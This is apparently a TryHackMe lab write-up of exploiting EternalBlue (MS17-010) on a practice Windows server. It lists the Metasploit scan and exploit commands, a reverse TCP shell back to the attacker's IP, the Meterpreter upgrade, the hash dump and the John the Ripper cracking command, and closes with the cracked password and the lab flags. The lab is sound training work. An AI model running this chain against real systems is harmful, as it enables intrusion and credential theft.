# TryHackMe - Blue (EternalBlue / MS17-010)

## Overview
Exploited MS17-010 (EternalBlue) vulnerability on a Windows Server 2012 R2 machine to gain SYSTEM-level access, escalated to Meterpreter, dumped and cracked password hashes.

## Recon
nmap -sV -sC -A -Pn <target-IP>

Open ports:
- 135 (msrpc)
- 139 (netbios-ssn)
- 445 (microsoft-ds) - Windows Server 2012 R2
- 3389 (RDP)
- 5985 (WinRM)

## Vulnerability Confirmation
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <target-IP>
run

Result: Host confirmed VULNERABLE to MS17-010

## Exploitation
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-IP>
set payload windows/x64/shell/reverse_tcp
set LHOST <VPN-IP>
run

Result: Got shell as nt authority\system

## Post-Exploitation
- Backgrounded shell, upgraded to Meterpreter using post/multi/manage/shell_to_meterpreter
- Ran hashdump to extract NTLM hashes
- Cracked Jon's password hash using John the Ripper + rockyou.txt
  john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  Cracked password: alqfna22

## Flags Captured
- flag{access_the_machine}
- flag{sam_database_elevated_access}
- flag{admin_documents_can_be_valuable}

## Key Takeaway
MS17-010 (EternalBlue) was developed by the NSA, leaked by Shadow Brokers, and later used in the 2017 WannaCry ransomware attack that affected 200,000+ computers across 150 countries, including NHS hospitals in the UK.
